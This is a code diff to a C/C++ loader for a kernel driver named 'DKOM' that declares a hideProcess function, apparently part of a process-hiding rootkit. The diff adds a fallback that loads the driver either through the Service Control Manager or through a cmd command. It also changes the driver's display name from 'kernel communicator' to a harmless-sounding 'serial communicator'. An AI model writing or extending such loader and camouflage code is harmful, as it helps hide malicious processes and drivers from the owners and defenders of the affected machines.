@@ -12,10 +12,12 @@ namespace Logs
 
 bool loadSysFileSCM(char* driverName, char* displayName);
 bool cmdLoadSysFile(char* driverName, char* displayName);
+bool tryLoadSysFile(char* driverName, char* displayName);
 //bool loadSysFile(char* driverName, char* displayName);
 bool hideProcess(char* driverName, int pid);
 
-#define loadSysFile cmdLoadSysFile
+#define loadSysFile tryLoadSysFile
+//#define loadSysFile cmdLoadSysFile
 //#define loadSysFile loadSysFileSCM
 
 int main(int argc, char *argv[])
@@ -27,7 +29,7 @@ int main(int argc, char *argv[])
 	//	printf("Not enougth arguments");
 	//else
 	char* driverName = "DKOM";
-	char* displayName = "\"kernel communicator\""; // TODO: put friendly name
+	char* displayName = "\"serial communicator\""; // friendly name
 	if (loadSysFile(driverName, displayName))//"friendly driver"))//argv[1]);
 		printf("success");//hideProcess(driverName, 4); //(int)argv[1]);
 	else
@@ -164,6 +166,13 @@ bool cmdLoadSysFile(char* driverName, char* displayName) // load with cmd comman
 		return FALSE;
 	}
 	return TRUE;
+}
+
+bool tryLoadSysFile(char * driverName, char * displayName)
+{
+	if (loadSysFileSCM(driverName, displayName) || cmdLoadSysFile(driverName, displayName))
+		return TRUE;
+	return FALSE;
 }
 
 #pragma endregion
